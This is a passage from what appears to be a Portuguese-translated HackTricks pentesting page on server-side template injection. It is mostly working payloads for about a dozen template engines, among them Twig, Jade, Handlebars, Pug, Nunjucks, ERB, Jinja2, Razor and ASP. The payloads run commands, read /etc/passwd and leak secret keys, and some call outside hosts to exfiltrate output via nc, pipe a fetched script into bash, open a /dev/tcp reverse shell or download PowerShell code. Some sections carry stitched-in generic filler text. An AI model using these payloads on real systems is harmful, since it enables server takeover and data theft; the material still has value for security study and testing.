* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#smarty)

### Twig (PHP)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{7*'7'}} = 49`
* `{{1/0}} = Erro`
* `{{foobar}} Nada`
```python
#Get Info
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

#File read
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

#Exec code
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
```
**Twig - Formato de Template**

Twig √© um mecanismo de template popular usado em v√°rias linguagens de programa√ß√£o, incluindo PHP. Ele fornece uma sintaxe simples e poderosa para criar templates din√¢micos. Neste guia, exploraremos a inje√ß√£o de template do lado do servidor (SSTI) usando o Twig.

## O que √© a inje√ß√£o de template do lado do servidor (SSTI)?

A inje√ß√£o de template do lado do servidor (SSTI) √© uma vulnerabilidade que ocorre quando um aplicativo web permite que um usu√°rio insira c√≥digo de template que √© executado no servidor. Isso pode levar a ataques de execu√ß√£o remota de c√≥digo (RCE), permitindo que um invasor execute comandos arbitr√°rios no servidor.

## Como funciona a inje√ß√£o de template do lado do servidor (SSTI) com o Twig?

A inje√ß√£o de template do lado do servidor (SSTI) com o Twig ocorre quando um aplicativo web usa o Twig para renderizar templates e permite que os usu√°rios insiram c√≥digo de template arbitr√°rio. Isso geralmente acontece quando o aplicativo n√£o valida ou filtra adequadamente as entradas do usu√°rio antes de pass√°-las para o mecanismo de template.

Um exemplo comum de inje√ß√£o de template do lado do servidor (SSTI) com o Twig √© quando um aplicativo permite que os usu√°rios insiram um nome de template que √© usado para carregar e renderizar um arquivo de template. Se o aplicativo n√£o validar ou filtrar corretamente o nome do template, um invasor pode inserir um nome de template malicioso que cont√©m c√≥digo de template malicioso. Esse c√≥digo ser√° executado no servidor, permitindo que o invasor execute comandos arbitr√°rios.

## Como explorar a inje√ß√£o de template do lado do servidor (SSTI) com o Twig?

Para explorar a inje√ß√£o de template do lado do servidor (SSTI) com o Twig, voc√™ precisa identificar pontos de entrada onde o c√≥digo de template √© inserido no aplicativo. Isso pode ser feito examinando o c√≥digo-fonte do aplicativo ou usando ferramentas de an√°lise de seguran√ßa.

Depois de identificar os pontos de entrada, voc√™ pode tentar inserir c√≥digo de template malicioso para explorar a vulnerabilidade. Isso pode incluir a execu√ß√£o de comandos do sistema, acesso a arquivos sens√≠veis ou at√© mesmo a execu√ß√£o de c√≥digo remoto.

## Como prevenir a inje√ß√£o de template do lado do servidor (SSTI) com o Twig?

Para prevenir a inje√ß√£o de template do lado do servidor (SSTI) com o Twig, √© importante seguir as pr√°ticas recomendadas de seguran√ßa, como:

- Validar e filtrar adequadamente todas as entradas do usu√°rio antes de pass√°-las para o mecanismo de template.
- Usar um conjunto restrito de vari√°veis e fun√ß√µes dispon√≠veis no contexto do template.
- Limitar as permiss√µes do usu√°rio no servidor para minimizar o impacto de uma poss√≠vel explora√ß√£o.

Al√©m disso, manter o Twig atualizado com as vers√µes mais recentes tamb√©m √© importante, pois as atualiza√ß√µes podem corrigir vulnerabilidades conhecidas.

## Conclus√£o

A inje√ß√£o de template do lado do servidor (SSTI) com o Twig √© uma vulnerabilidade s√©ria que pode levar a ataques de execu√ß√£o remota de c√≥digo (RCE). √â importante entender como essa vulnerabilidade funciona e como preveni-la para garantir a seguran√ßa de seus aplicativos web.
```php
$output = $twig > render (
'Dear' . $_GET['custom_greeting'],
array("first_name" => $user.first_name)
);

$output = $twig > render (
"Dear {first_name}",
array("first_name" => $user.first_name)
);
```
**Mais informa√ß√µes**

* Na se√ß√£o Twig e Twig (Sandboxed) de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#twig)

### Plates (PHP)

Plates √© inspirado no Twig, mas √© um mecanismo de template PHP nativo em vez de um mecanismo de template compilado.

controlador:
```php
// Create new Plates instance
$templates = new League\Plates\Engine('/path/to/templates');

// Render a template
echo $templates->render('profile', ['name' => 'Jonathan']);
```
modelo de p√°gina:
```php
<?php $this->layout('template', ['title' => 'User Profile']) ?>

<h1>User Profile</h1>
<p>Hello, <?=$this->e($name)?></p>
```
modelo de layout:
```html
<html>
<head>
<title><?=$this->e($title)?></title>
</head>
<body>
<?=$this->section('content')?>
</body>
</html>
```
### PHPlib e HTML\_Template\_PHPLIB (PHP)

[HTML\_Template\_PHPLIB](https://github.com/pear/HTML\_Template\_PHPLIB) √© o mesmo que PHPlib, mas portado para Pear.

`authors.tpl`
```html
<html>
<head><title>{PAGE_TITLE}</title></head>
<body>
<table>
<caption>Authors</caption>
<thead>
<tr><th>Name</th><th>Email</th></tr>
</thead>
<tfoot>
<tr><td colspan="2">{NUM_AUTHORS}</td></tr>
</tfoot>
<tbody>
<!-- BEGIN authorline -->
<tr><td>{AUTHOR_NAME}</td><td>{AUTHOR_EMAIL}</td></tr>
<!-- END authorline -->
</tbody>
</table>
</body>
</html>
```
# Inje√ß√£o de Template do Lado do Servidor (SSTI)

## Descri√ß√£o

Este diret√≥rio cont√©m um exemplo de aplica√ß√£o web vulner√°vel a ataques de Inje√ß√£o de Template do Lado do Servidor (SSTI). A vulnerabilidade ocorre quando um aplicativo web permite que o usu√°rio insira c√≥digo de template que √© executado no servidor.

O arquivo `authors.php` √© um exemplo de p√°gina que exibe informa√ß√µes sobre autores de livros. Ele usa um mecanismo de template para renderizar os dados na p√°gina. No entanto, o aplicativo n√£o valida ou filtra adequadamente as entradas do usu√°rio, o que permite a inje√ß√£o de c√≥digo de template malicioso.

## Explora√ß√£o

Para explorar essa vulnerabilidade, voc√™ pode inserir c√≥digo de template malicioso na entrada do par√¢metro `author` na URL. O c√≥digo de template ser√° executado no servidor e poder√° ser usado para executar comandos arbitr√°rios, ler arquivos sens√≠veis ou realizar outras a√ß√µes indesejadas.

Por exemplo, voc√™ pode tentar inserir o seguinte c√≥digo de template na URL:

```
http://localhost/authors.php?author={{7*7}}
```

Isso resultar√° na exibi√ß√£o do resultado da express√£o `7*7` na p√°gina.

## Mitiga√ß√£o

Para mitigar essa vulnerabilidade, √© importante validar e filtrar adequadamente as entradas do usu√°rio antes de us√°-las em um mecanismo de template. Isso pode ser feito usando bibliotecas ou frameworks que possuem recursos de seguran√ßa embutidos para evitar a execu√ß√£o de c√≥digo malicioso.

Al√©m disso, √© recomend√°vel manter todos os componentes do aplicativo web atualizados com as vers√µes mais recentes, pois as atualiza√ß√µes frequentemente corrigem vulnerabilidades conhecidas.
```php
<?php
//we want to display this author list
$authors = array(
'Christian Weiske'  => 'cweiske@php.net',
'Bjoern Schotte'     => 'schotte@mayflower.de'
);

require_once 'HTML/Template/PHPLIB.php';
//create template object
$t =& new HTML_Template_PHPLIB(dirname(__FILE__), 'keep');
//load file
$t->setFile('authors', 'authors.tpl');
//set block
$t->setBlock('authors', 'authorline', 'authorline_ref');

//set some variables
$t->setVar('NUM_AUTHORS', count($authors));
$t->setVar('PAGE_TITLE', 'Code authors as of ' . date('Y-m-d'));

//display the authors
foreach ($authors as $name => $email) {
$t->setVar('AUTHOR_NAME', $name);
$t->setVar('AUTHOR_EMAIL', $email);
$t->parse('authorline_ref', 'authorline', true);
}

//finish and echo
echo $t->finish($t->parse('OUT', 'authors'));
?>
```
### Jade (NodeJS)

O Jade √© um mecanismo de modelo de servidor-side para NodeJS que permite a inje√ß√£o de c√≥digo no lado do servidor. Ele √© usado para gerar HTML dinamicamente com base em modelos. No entanto, a inje√ß√£o de modelo no lado do servidor pode levar a vulnerabilidades de inje√ß√£o de c√≥digo, como a inje√ß√£o de modelo no lado do servidor (SSTI).

A inje√ß√£o de modelo no lado do servidor ocorre quando um invasor consegue inserir c√≥digo malicioso em um modelo que √© posteriormente processado pelo servidor. Isso pode permitir que o invasor execute c√≥digo arbitr√°rio no servidor, o que pode levar a uma s√©rie de problemas de seguran√ßa, como vazamento de informa√ß√µes confidenciais, execu√ß√£o remota de c√≥digo e comprometimento do servidor.

Para explorar uma vulnerabilidade de SSTI no Jade, um invasor precisa encontrar um ponto de inje√ß√£o no modelo e inserir c√≥digo malicioso. Isso pode ser feito atrav√©s da manipula√ß√£o de entradas do usu√°rio ou da explora√ß√£o de falhas de valida√ß√£o de entrada no c√≥digo do aplicativo.

Para mitigar o risco de SSTI no Jade, √© importante seguir as pr√°ticas recomendadas de seguran√ßa, como:

- Validar e sanitizar todas as entradas do usu√°rio antes de process√°-las no modelo.
- Evitar a execu√ß√£o de c√≥digo arbitr√°rio no servidor a partir do modelo.
- Limitar as permiss√µes do servidor para minimizar o impacto de uma poss√≠vel explora√ß√£o de SSTI.

Ao realizar testes de penetra√ß√£o em um aplicativo que usa o Jade como mecanismo de modelo, √© importante verificar se existem pontos de inje√ß√£o de modelo no lado do servidor e tentar explorar essas vulnerabilidades para identificar poss√≠veis riscos de seguran√ßa.
```javascript
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

```javascript
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```
**Mais informa√ß√µes**

* Na se√ß√£o Jade de [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jade--codepen)

### patTemplate (PHP)

> [patTemplate](https://github.com/wernerwa/pat-template) √© um mecanismo de modelagem PHP n√£o compilado, que usa tags XML para dividir um documento em diferentes partes.
```xml
<patTemplate:tmpl name="page">
This is the main page.
<patTemplate:tmpl name="foo">
It contains another template.
</patTemplate:tmpl>
<patTemplate:tmpl name="hello">
Hello {NAME}.<br/>
</patTemplate:tmpl>
</patTemplate:tmpl>
```
### Handlebars (NodeJS)

Travessia de Caminho (mais informa√ß√µes [aqui](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/)).
```bash
curl -X 'POST' -H 'Content-Type: application/json' --data-binary $'{\"profile\":{"layout\": \"./../routes/index.js\"}}' 'http://ctf.shoebpatel.com:9090/'
```
* \= Erro
* ${7\*7} = ${7\*7}
* Nada
```java
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return require('child_process').exec('whoami');"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}

URLencoded:
%7B%7B%23with%20%22s%22%20as%20%7Cstring%7C%7D%7D%0D%0A%20%20%7B%7B%23with%20%22e%22%7D%7D%0D%0A%20%20%20%20%7B%7B%23with%20split%20as%20%7Cconslist%7C%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epush%20%28lookup%20string%2Esub%20%22constructor%22%29%7D%7D%0D%0A%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%23with%20string%2Esplit%20as%20%7Ccodelist%7C%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epush%20%22return%20require%28%27child%5Fprocess%27%29%2Eexec%28%27whoami%27%29%3B%22%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7Bthis%2Epop%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%23each%20conslist%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%23with%20%28string%2Esub%2Eapply%200%20codelist%29%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7B%7Bthis%7D%7D%0D%0A%20%20%20%20%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%20%20%20%20%7B%7B%2Feach%7D%7D%0D%0A%20%20%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%20%20%7B%7B%2Fwith%7D%7D%0D%0A%20%20%7B%7B%2Fwith%7D%7D%0D%0A%7B%7B%2Fwith%7D%7D
```
**Mais informa√ß√µes**

* [http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

### JsRender (NodeJS)

| **Modelo** | **Descri√ß√£o**                         |
| ------------ | --------------------------------------- |
|              | Avaliar e renderizar sa√≠da              |
|              | Avaliar e renderizar sa√≠da codificada em HTML |
|              | Coment√°rio                                 |
| e          | Permitir c√≥digo (desativado por padr√£o)        |

* \= 49

**Lado do Cliente**
```python
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
```
**Lado do Servidor**
```bash
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```
**Mais informa√ß√µes**

* [https://appcheck-ng.com/template-injection-jsrender-jsviews/](https://appcheck-ng.com/template-injection-jsrender-jsviews/)

### PugJs (NodeJS)

* `#{7*7} = 49`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}`
* `#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('curl 10.10.14.3:8001/s.sh | bash')}()}`

**Exemplo de renderiza√ß√£o do lado do servidor**
```javascript
var pugjs = require('pug');
home = pugjs.render(injected_page)
```
**Mais informa√ß√µes**

* [https://licenciaparahackear.github.io/pt/posts/burlando-um-sandbox-js-restritivo/](https://licenciaparahackear.github.io/pt/posts/burlando-um-sandbox-js-restritivo/)

### NUNJUCKS (NodeJS) <a href="#nunjucks" id="nunjucks"></a>

* \{{7\*7\}} = 49
* \{{foo\}} = Sem sa√≠da
* \#{7\*7} = #{7\*7}
* \{{console.log(1)\}} = Erro
```javascript
{{range.constructor("return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')")()}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/10.10.14.11/6767 0>&1\"')")()}}
```
**Mais informa√ß√µes**

* [http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

### ERB (Ruby)

* `{{7*7}} = {{7*7}}`
* `${7*7} = ${7*7}`
* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erro`
```python
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
**Mais informa√ß√µes**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Slim (Ruby)

* `{ 7 * 7 }`
```
{ %x|env| }
```
**Mais informa√ß√µes**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#ruby)

### Python

Confira a seguinte p√°gina para aprender truques sobre **execu√ß√£o de comandos arbitr√°rios contornando ambientes restritos** em python:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Tornado (Python)

* `{{7*7}} = 49`
* `${7*7} = ${7*7}`
* `{{foobar}} = Error`
* `{{7*'7'}} = 7777777`
```python
{% raw %}
{% import foobar %} = Error
{% import os %}

{% import os %}
{% endraw %}




{{os.system('whoami')}}
{{os.system('whoami')}}
```
**Mais informa√ß√µes**

### Jinja2 (Python)

[Website oficial](http://jinja.pocoo.org)

> Jinja2 √© um mecanismo de template completo para Python. Possui suporte completo a unicode, um ambiente de execu√ß√£o integrado opcionalmente isolado, amplamente utilizado e licenciado sob a BSD.

* `{{7*7}} = Erro`
* `${7*7} = ${7*7}`
* `{{foobar}} Nada`
* `{{4*4}}[[5*5]]`
* `{{7*'7'}} = 7777777`
* `{{config}}`
* `{{config.items()}}`
* `{{settings.SECRET_KEY}}`
* `{{settings}}`
* `<div data-gb-custom-block data-tag="debug"></div>`
```python
{% raw %}
{% debug %}
{% endraw %}



{{settings.SECRET_KEY}}
{{4*4}}[[5*5]]
{{7*'7'}} would result in 7777777
```
**Jinja2 - Formato de Template**

Jinja2 √© um mecanismo de template popular para Python. Ele permite a cria√ß√£o de templates din√¢micos, onde √© poss√≠vel inserir vari√°veis, estruturas de controle e express√µes dentro do c√≥digo HTML. Os templates Jinja2 s√£o salvos com a extens√£o `.html` e podem ser renderizados pelo servidor web.

**Inje√ß√£o de Template do Lado do Servidor (SSTI)**

A Inje√ß√£o de Template do Lado do Servidor (SSTI) √© uma vulnerabilidade que ocorre quando um aplicativo web permite que o usu√°rio insira c√≥digo malicioso em um template. Isso pode levar √† execu√ß√£o de c√≥digo arbitr√°rio no servidor, permitindo que um invasor comprometa o sistema.

**Explorando a Inje√ß√£o de Template do Lado do Servidor**

Para explorar a SSTI, √© necess√°rio identificar onde o c√≥digo injetado √© processado e renderizado pelo servidor. Em muitos casos, os aplicativos web usam o mecanismo de template Jinja2 para renderizar os templates. Portanto, √© importante entender a sintaxe e as funcionalidades do Jinja2 para explorar essa vulnerabilidade.

**Sintaxe do Jinja2**

O Jinja2 usa uma sintaxe semelhante ao Python para inserir vari√°veis e express√µes nos templates. As vari√°veis s√£o colocadas entre chaves duplas `{{ }}`, enquanto as estruturas de controle s√£o colocadas entre chaves percentuais `{% %}`. Al√©m disso, √© poss√≠vel usar filtros para modificar os valores das vari√°veis.

**Exemplo de Template Jinja2**

Aqui est√° um exemplo de um template Jinja2 b√°sico:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Exemplo de Template Jinja2</title>
</head>
<body>
    <h1>Bem-vindo(a), {{ nome }}!</h1>
    <p>Seu saldo atual √© de R$ {{ saldo | floatformat(2) }}.</p>
</body>
</html>
```

Neste exemplo, o template exibe uma mensagem de boas-vindas com o nome do usu√°rio e o saldo atual formatado com duas casas decimais.

**Preven√ß√£o da Inje√ß√£o de Template do Lado do Servidor**

Para prevenir a SSTI, √© importante validar e sanitizar todas as entradas do usu√°rio antes de process√°-las nos templates. Al√©m disso, √© recomendado desabilitar recursos perigosos do Jinja2, como a execu√ß√£o de c√≥digo Python.

**Conclus√£o**

A Inje√ß√£o de Template do Lado do Servidor √© uma vulnerabilidade s√©ria que pode permitir a execu√ß√£o de c√≥digo arbitr√°rio no servidor. Ao entender a sintaxe e as funcionalidades do Jinja2, √© poss√≠vel explorar essa vulnerabilidade e tomar medidas para preveni-la.
```python
{% raw %}
{% extends "layout.html" %}
{% block body %}
<ul>
{% for user in users %}
<li><a href="{{ user.url }}">{{ user.username }}</a></li>
{% endfor %}
</ul>
{% endblock %}
{% endraw %}


```
[**RCE n√£o dependente de**](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/) `__builtins__`:
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

# Or in the shotest versions:
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```
**Mais detalhes sobre como abusar do Jinja**:

{% content-ref url="jinja2-ssti.md" %}
[jinja2-ssti.md](jinja2-ssti.md)
{% endcontent-ref %}

### Mako (Python)
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```
### Razor (.Net)

* `@(2+2) <= Sucesso`
* `@() <= Sucesso`
* `@("{{code}}") <= Sucesso`
* `@ <= Sucesso`
* `@{} <= ERRO!`
* `@{ <= ERRO!`
* `@(1+2)`
* `@( //C#Code )`
* `@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");`
*   `@System.Diagnostics.Process.Start("cmd.exe","/c powershell.exe -enc IABpAHcAcgAgAC0AdQByAGkAIABoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyAC4AQAxADEALwB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAYQBzAGsAcwBcAHQAZQBzAHQAbQBlAHQANgA0AC4AZQB4AGUAOwAgAEMAOgBcAFcAaQBuAGQAbw3cAcwBcAGEAcwBrAHMAXAB0AGUAcwB0AG0AZQB0ADYANAAuAGUAeABlAA==");`

O m√©todo `System.Diagnostics.Process.Start` do .NET pode ser usado para iniciar qualquer processo no servidor e, assim, criar um webshell. Voc√™ pode encontrar um exemplo de aplicativo da web vulner√°vel em [https://github.com/cnotin/RazorVulnerableApp](https://github.com/cnotin/RazorVulnerableApp)

**Mais informa√ß√µes**

* [https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-(SSTI)-in-ASP.NET-Razor/](https://clement.notin.org/blog/2020/04/15/Server-Side-Template-Injection-\(SSTI\)-in-ASP.NET-Razor/)
* [https://www.schtech.co.uk/razor-pages-ssti-rce/](https://www.schtech.co.uk/razor-pages-ssti-rce/)

### ASP

* `<%= 7*7 %>` = 49
* `<%= "foo" %>` = foo
* `<%= foo %>` = Nada
* `<%= response.write(date()) %>` = \<Data>
```bash
<%= CreateObject("Wscript.Shell").exec("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11:8000/shell.ps1')").StdOut.ReadAll() %>
```
**Mais Informa√ß√µes**

* [https://www.w3schools.com/asp/asp\_examples.asp](https://www.w3schools.com/asp/asp\_examples.asp)

### Mojolicious (Perl)

Mesmo sendo perl, ele usa tags como ERB em Ruby.

* `<%= 7*7 %> = 49`
* `<%= foobar %> = Erro`
```
<%= perl code %>
<% perl code %>
```
### SSTI em GO

Para confirmar que o mecanismo de template usado no backend √© Go, voc√™ pode usar esses payloads:

* `{{ . }}` = estrutura de dados sendo passada como entrada para o template
* Se os dados passados forem um objeto que cont√©m o atributo Password, por exemplo, o payload anterior vazaria isso, mas voc√™ tamb√©m poderia fazer: `{{ .Password }}`
* `{{printf "%s" "ssti" }}` = deve exibir a string ssti na resposta
* `{{html "ssti"}}`, `{{js "ssti"}}` = Esses s√£o alguns outros payloads que devem exibir a string "ssti" sem as palavras "js" ou "html" no final. Voc√™ pode consultar mais palavras-chave no mecanismo [aqui](https://golang.org/pkg/text/template).

**Explora√ß√£o de XSS**

Se o servidor estiver **usando o pacote text/template**, √© muito f√°cil alcan√ßar o XSS **simplesmente** fornecendo seu **payload** como entrada. No entanto, isso **n√£o √© o caso com html/template**, pois ele codifica a resposta em HTML: `{{"<script>alert(1)</script>"}}` --> `&lt;script&gt;alert(1)&lt;/script&gt;`

No entanto, o Go permite **DEFINIR** um **template** completo e depois **cham√°-lo posteriormente**. O payload ser√° algo como:\
`{{define "T1"}}<script>alert(1)</script>{{end}} {{template "T1"}}`

**Explora√ß√£o de RCE**

A documenta√ß√£o para o m√≥dulo html/template pode ser encontrada [aqui](https://golang.org/pkg/html/template/), e a documenta√ß√£o para o m√≥dulo text/template pode ser encontrada [aqui](https://golang.org/pkg/text/template/), e sim, elas s√£o diferentes, muito diferentes. Por exemplo, em **text/template**, voc√™ pode **chamar diretamente qualquer fun√ß√£o p√∫blica com o valor "call"**, no entanto, esse n√£o √© o caso com html/template.

Se voc√™ deseja encontrar um RCE em Go via SSTI, saiba que, assim como voc√™ pode acessar o objeto fornecido ao template com `{{ . }}`, voc√™ tamb√©m pode **chamar os m√©todos do objeto**. Portanto, imagine que o **objeto passado tenha um m√©todo chamado System** que executa o comando fornecido, voc√™ pode abusar dele com: `{{ .System "ls" }}`\
Portanto, provavelmente voc√™ **precisar√° do c√≥digo-fonte**. Um c√≥digo-fonte potencial para algo assim seria:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**Mais informa√ß√µes**

* [https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### Mais Exploits

Verifique o restante em [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) para mais exploits. Voc√™ tamb√©m pode encontrar informa√ß√µes interessantes sobre tags em [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)

## BlackHat PDF

{% file src="../../.gitbook/assets/en-server-side-template-injection-rce-for-the-modern-web-app-blackhat-15.pdf" %}

## Ajuda Relacionada

Se voc√™ acha que pode ser √∫til, leia:

* [Dicas do Flask](../../network-services-pentesting/pentesting-web/flask.md)
* [Fun√ß√µes m√°gicas do Python](broken-reference/)

## Ferramentas

{% embed url="https://github.com/epinna/tplmap" %}

## Lista de Detec√ß√£o de For√ßa Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## Pr√°tica e Refer√™ncias

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [**https://portswigger.net/web-security/server-side-template-injection**](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
